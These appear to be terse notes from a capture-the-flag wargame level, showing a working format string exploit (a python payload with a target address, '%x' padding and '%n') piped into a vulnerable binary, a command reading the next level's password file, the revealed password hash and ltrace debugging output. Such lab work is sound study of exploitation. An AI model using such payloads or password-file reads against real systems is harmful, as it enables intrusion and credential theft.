(python -c "print ('AAAA' + '\x8c\x98\x04\x08' + '%x '*4 + 'A'*25 + '%n')"; cat) | ./level3
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa


(python -c "print ('AAAA' + '\x8c\x98\x04\x08' + '%x '*4 + 'A'*24 + '%n')") | ./level3 | wc
64

(python -c "print ('AAAA' + '\x8c\x98\x04\x08' + '%x '*4 + 'A'*24 + '%n')") | ltrace ./level3
__libc_start_main(0x804851a, 1, 0xbffff7a4, 0x8048530, 0x80485a0 <unfinished ...>
fgets("AAAA\214\230\004\b%x %x %x %x AAAAAAAAAAAA"..., 512, 0xb7fd1ac0)         = 0xbffff4f0
printf("AAAA\214\230\004\b%x %x %x %x AA"..., 0x200, 0xb7fd1ac0, 0xb7ff37d0, 0x41414141AAAA�200 b7fd1ac0 b7ff37d0 41414141 AAAAAAAAAAAAAAAAAAAAAAAA
) = 64
+++ exited (status 63) +++



https://nikhilh20.medium.com/format-string-exploit-ccefad8fd66b

